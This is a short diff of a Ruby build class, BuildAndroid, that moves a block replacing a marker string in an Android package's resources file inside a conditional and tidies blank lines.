@@ -37,7 +37,6 @@ class BuildAndroid < Build
   end
 
   def patch(params)
-
     trace :debug, "Build: patching: #{params}"
 
     # enforce demo flag accordingly to the license
@@ -53,22 +52,21 @@ class BuildAndroid < Build
       # these params will be passed to the super
       params[:core] = "apk.#{version}/res/raw/resources.bin"
       params[:config] = "apk.#{version}/res/raw/config.bin"
-
+      
       # invoke the generic patch method with the new params
       super
-    end
-
-    patch_file(:file => params[:core]) do |content|
-      begin
-        method = params['admin'] ? 'IrXCtyrrDXMJEvOU' : SecureRandom.random_bytes(16)
-        content['IrXCtyrrDXMJEvOU'] = method
-      rescue
-        raise "Working method marker not found"
-      ensure
-        content
+      
+      patch_file(:file => params[:core]) do |content|
+        begin
+          method = params['admin'] ? 'IrXCtyrrDXMJEvOU' : SecureRandom.random_bytes(16)
+          content['IrXCtyrrDXMJEvOU'] = method
+        rescue
+          raise "Working method marker not found"
+        ensure
+          content
+        end
       end
     end
-
   end
 
   def melt(params)
